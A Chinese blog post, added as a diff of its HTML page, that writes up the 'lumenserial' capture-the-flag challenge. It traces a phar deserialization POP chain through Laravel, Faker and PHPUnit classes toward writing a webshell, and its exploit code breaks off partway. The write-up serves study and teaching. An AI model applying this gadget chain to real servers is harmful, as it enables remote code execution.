@@ -1,0 +1,510 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>从lumenserial中学phar反序列化漏洞 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="从lumenserial中学phar反序列化漏洞">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-02-27 10:24" pubdate>
+        2019年2月27日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      26
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">从lumenserial中学phar反序列化漏洞</h1>
+            
+            <div class="markdown-body">
+              <p>Code-breaking 中有一道考察phar反序列化漏洞的medium题目——lumenserial，POP链很深，很值得学习。</p>
+<a id="more"></a>
+
+
+
+<h2 id="1-分析过程"><a href="#1-分析过程" class="headerlink" title="1. 分析过程"></a>1. 分析过程</h2><h3 id="1-1-前期准备"><a href="#1-1-前期准备" class="headerlink" title="1.1 前期准备"></a>1.1 前期准备</h3><p>线上环境中，PHP版本为<code>7.2.15</code>，这意味着不能动态调用<code>assert</code>函数。</p>
+<p>还禁用了不少系统函数。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">system</span>,shell_exec,passthru,<span class="hljs-keyword">exec</span>,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,<span class="hljs-keyword">symlink</span>,<span class="hljs-keyword">link</span>,error_log<br></code></pre></td></tr></table></figure>
+<p>拿到源码后，先看一下<code>routes/web.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$router</span>-&gt;get(<span class="hljs-string">&#x27;/server/editor&#x27;</span>, <span class="hljs-string">&#x27;EditorController@main&#x27;</span>);<br><br><span class="hljs-variable">$router</span>-&gt;post(<span class="hljs-string">&#x27;/server/editor&#x27;</span>, <span class="hljs-string">&#x27;EditorController@main&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<p><code>EditorController</code>应该是个关键点，看一下<code>app/Http/Controllers/EditorController.php</code>。</p>
+<p>在类<code>EditorController</code>中有一个<code>doCatchimage()</code>方法，实现了一个远程捕获图片的功能。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EditorController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//省略部分代码......</span><br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doCatchimage</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sources</span> = <span class="hljs-variable">$request</span>-&gt;input(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;catcherFieldName&#x27;</span>]);<br>        <span class="hljs-variable">$rets</span> = [];<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$sources</span>) &#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$sources</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$url</span>) &#123;<br>                <span class="hljs-variable">$rets</span>[] = <span class="hljs-keyword">$this</span>-&gt;download(<span class="hljs-variable">$url</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> response()-&gt;json([<br>            <span class="hljs-string">&#x27;state&#x27;</span> =&gt; <span class="hljs-string">&#x27;SUCCESS&#x27;</span>,<br>            <span class="hljs-string">&#x27;list&#x27;</span> =&gt; <span class="hljs-variable">$rets</span><br>        ]);<br>    &#125;<br><br>    <span class="hljs-comment">//省略部分代码......</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$maxSize</span> = <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;catcherMaxSize&#x27;</span>];<br>        <span class="hljs-variable">$limitExtension</span> = array_map(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$ext</span></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> ltrim(<span class="hljs-variable">$ext</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        &#125;, <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;catcherAllowFiles&#x27;</span>]);<br>        <span class="hljs-variable">$allowTypes</span> = array_map(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$ext</span></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;image/<span class="hljs-subst">&#123;$ext&#125;</span>&quot;</span>;<br>        &#125;, <span class="hljs-variable">$limitExtension</span>);<br><br>        <span class="hljs-variable">$content</span> = file_get_contents(<span class="hljs-variable">$url</span>);<br>        <span class="hljs-variable">$img</span> = getimagesizefromstring(<span class="hljs-variable">$content</span>);<br><br>        <span class="hljs-comment">//省略部分代码......</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可以看到，<code>doCatchimage()</code>传入了一个<code>Request $request</code>，然后从中获取<code>$url</code>参数，在没有经过任何处理的情况下传入<code>download()</code>方法中，而且网站本身就是一个富文本编辑器，有上传图片的功能，这样我们可以在<code>$content = file_get_contents($url);</code>处来进行phar反序列化。</p>
+<p>由于版本和配置限制，我们最终的目标，应该构造类似<code>call_user_func_array(&#39;file_put_contents&#39;, [])</code>来写马。</p>
+<h3 id="1-2-POP链构造"><a href="#1-2-POP链构造" class="headerlink" title="1.2 POP链构造"></a>1.2 POP链构造</h3><p><code>phar</code>反序列化的其他条件都满足了，重点就在<code>POP</code>链的构造上。</p>
+<p>在<code>phpggc</code>中。<code>Laravel</code>的一些<code>RCE</code>都是从<code>Illuminate\Broadcasting\PendingBroadcast::__destruct</code>走的，我们也可以以此为出发点。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingBroadcast</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$events</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$event</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">Dispatcher <span class="hljs-variable">$events</span>, <span class="hljs-variable">$event</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;event = <span class="hljs-variable">$event</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;events = <span class="hljs-variable">$events</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//省略部分代码......</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;events-&gt;dispatch(<span class="hljs-keyword">$this</span>-&gt;event);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>在这里<code>Dispatcher</code>是一个接口，因此<code>$events</code>是继承了该接口的类。</p>
+<p><img src="https://image.mengsec.com/code-breaking-lumenserial/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>只有这两个类继承了<code>Dispatcher</code>，而且它们的<code>dispatch()</code>方法都难以利用。</p>
+<p>只能换个方向，去寻找存在<code>__call()</code>魔术方法的类。</p>
+<blockquote>
+<p><strong>__call()</strong> 在对象中调用一个不可访问方法时调用。<br>该方法有两个参数，第一个参数 <code>$function_name</code> 会自动接收不存在的方法名，第二个 <code>$arguments</code> 则以数组的方式接收不存在方法的多个参数。</p>
+</blockquote>
+<p><img src="https://image.mengsec.com/code-breaking-lumenserial/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p><code>vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</code>第52行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-variable">$res</span> = call_user_func_array(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>-&gt;generator, <span class="hljs-variable">$name</span>), <span class="hljs-variable">$arguments</span>);<br>        <span class="hljs-variable">$i</span>++;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span> &gt; <span class="hljs-keyword">$this</span>-&gt;maxRetries) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">OverflowException</span>(sprintf(<span class="hljs-string">&#x27;Maximum retries of %d reached without finding a valid value&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;maxRetries));<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (!call_user_func(<span class="hljs-keyword">$this</span>-&gt;validator, <span class="hljs-variable">$res</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这个类应该满足条件，继续往下分析。</p>
+<p>若是调用类<code>ValidGenerator</code>的<code>__call()</code>方法，<code>$name</code>的值是<code>dispatch</code>，传入的<code>$arguments</code>是一个数组。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = call_user_func_array(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>-&gt;generator, <span class="hljs-variable">$name</span>), <span class="hljs-variable">$arguments</span>);<br></code></pre></td></tr></table></figure>
+<p>继续往下分析，看看能不能完全控制<code>call_user_func_array()</code>的参数，目标是控制<code>$res</code>的值，从而在下面<code>while</code>处完成调用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">while</span> (!call_user_func(<span class="hljs-keyword">$this</span>-&gt;validator, <span class="hljs-variable">$res</span>));<br></code></pre></td></tr></table></figure>
+<p>在<code>ValidGenerator</code>类的构造函数中，传入了<code>Generator</code>类的实例。</p>
+<p><code>vendor/fzaninotto/faker/src/Faker/Generator.php</code></p>
+<p>因为<code>Generator</code>中没有<code>dispatch</code>方法，所以会调用它的<code>__call()</code>方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;format(<span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span>(<span class="hljs-params"><span class="hljs-variable">$formatter</span>, <span class="hljs-variable">$arguments</span> = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> call_user_func_array(<span class="hljs-keyword">$this</span>-&gt;getFormatter(<span class="hljs-variable">$formatter</span>), <span class="hljs-variable">$arguments</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFormatter</span>(<span class="hljs-params"><span class="hljs-variable">$formatter</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>])) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>];<br>    &#125;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;providers <span class="hljs-keyword">as</span> <span class="hljs-variable">$provider</span>) &#123;<br>        <span class="hljs-keyword">if</span> (method_exists(<span class="hljs-variable">$provider</span>, <span class="hljs-variable">$formatter</span>)) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$provider</span>, <span class="hljs-variable">$formatter</span>);<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">InvalidArgumentException</span>(sprintf(<span class="hljs-string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="hljs-variable">$formatter</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>在这里，在<code>Generator</code>类中嵌套调用<code>Generator</code>类，实现返回任意类的功能。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$g2</span>-&gt;formatters = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;mengchen&#x27;</span> =&gt; <span class="hljs-variable">$evalobj</span>);<br><span class="hljs-variable">$g1</span>-&gt;formatters = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&quot;dispatch&quot;</span> =&gt; <span class="hljs-keyword">array</span>(<br>        <span class="hljs-variable">$g2</span>, <br>        <span class="hljs-string">&quot;getFormatter&quot;</span>,<br>    )<br>);<br></code></pre></td></tr></table></figure>
+<p>当在<code>$g1</code>中调用<code>dispatch(&#39;可控值&#39;)</code>时，由于类中不存在该方法，则调用<code>__call()</code>。</p>
+<p>假设执行的代码为<code>$g1-&gt;dispatch(&#39;mengchen&#39;);</code>。</p>
+<p>则传给<code>__call($method, $attributes)</code>，传入的参数<code>$method=&#39;dispatch&#39;</code>、<code>$attributes = [&#39;mengchen&#39;]</code>。</p>
+<p>然后进入<code>format($formatter, $arguments = array())</code>，此时，传入的参数<code>$formatter=&#39;dispatch&#39;</code>、<code>$arguments=[&#39;mengchen&#39;]</code>。</p>
+<p>接下来，在函数<code>call_user_func_array()</code>中，<code>$this-&gt;getFormatter($formatter)</code>，就是<code>$g1-&gt;getFormatter(&#39;dispatch&#39;) === [$g2, &quot;getFormatter&quot;]</code>。</p>
+<p>也就是执行函数<code>call_user_func_array([​$g2, &quot;getFormatter&quot;], [&#39;mengchen&#39;])</code>。</p>
+<p>也就调用了<code>$g2-&gt;getFormatter(&#39;mengchen&#39;) === $evalobj</code>。</p>
+<p>这样就实现了返回任意一个类。</p>
+<p>此时<code>$res == $evalobj</code>。</p>
+<p>到此<code>while (!call_user_func($this-&gt;validator, $res));</code>中的<code>$res</code>我们完全可控了，接下来看<code>$this-&gt;validator</code>。</p>
+<p>在这里找了一个类来做跳板。</p>
+<p><code>vendor/phpunit/phpunit/src/Framework/MockObject/Stub/ReturnCallback.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReturnCallback</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Stub</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$callback</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$callback</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;callback = <span class="hljs-variable">$callback</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invoke</span>(<span class="hljs-params">Invocation <span class="hljs-variable">$invocation</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> \call_user_func_array(<span class="hljs-keyword">$this</span>-&gt;callback, <span class="hljs-variable">$invocation</span>-&gt;getParameters());<br>    &#125;<br>    <span class="hljs-comment">//省略部分代码......</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>在函数<code>invoke()</code>中，<code>call_user_func_array()</code>的两个参数都是反序列化可控的。<code>Invocation</code>是一个接口，找一下<code>getParameters()</code>的实现。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StaticInvocation</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Invocation</span>, <span class="hljs-title">SelfDescribing</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//省略部分代码......</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$parameters</span>;<br><br>    <span class="hljs-comment">//省略部分代码......</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getParameters</span>(<span class="hljs-params"></span>): <span class="hljs-title">array</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;parameters;<br>    &#125;<br>    <span class="hljs-comment">//省略部分代码......</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p><code>call_user_func_array(</code>)的两个参数我们都能控制了，然后在<code>ValidGenerator</code>类的<code>while (!call_user_func($this-&gt;validator, $res));</code>中完成调用即可。</p>
+<p>到此完成整个POP链。</p>
+<h3 id="1-3-攻击思路"><a href="#1-3-攻击思路" class="headerlink" title="1.3 攻击思路"></a>1.3 攻击思路</h3><p>令<code>$this-&gt;validator</code> == <code>[$ReturnCallbackobj, &#39;invoke&#39;]</code>，这样<code>$this-&gt;validator</code>就成了<code>invoke()</code>方法，然后<code>call_user_func()</code>调用<code>invoke()</code>方法，<code>invoke()</code>调用<code>call_user_func_array()</code>，因为<code>call_user_func_array()</code>的两参数可控，这样就能<code>getshell</code>了。</p>
+<h2 id="2-Exp"><a href="#2-Exp" class="headerlink" title="2. Exp"></a>2. Exp</h2><p>由上面的分析过程，可以构造最终Exp。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span>&#123;<br>	<span class="hljs-title">class</span> <span class="hljs-title">PendingBroadcast</span>&#123;<br>		<span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()&#123;<br>			$<span class="hljs-title">this</span>-&gt;<span class="hljs-title">events</span> = <span class="hljs-title">new</span> \<span class="hljs-title">Faker</span>\<span class="hljs-title">ValidGenerator</span>();<br>			<span class="hljs-keyword">$this</span>-&gt;event = <span class="hljs-string">&#x27;mengchen&#x27;</span>;<br>		&#125;<br>	&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>	<span class="hljs-title">class</span> <span class="hljs-title">ValidGenerator</span>&#123;<br>		<span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()&#123;<br>			$<span class="hljs-title">si</span> = <span class="hljs-title">new</span> \<span 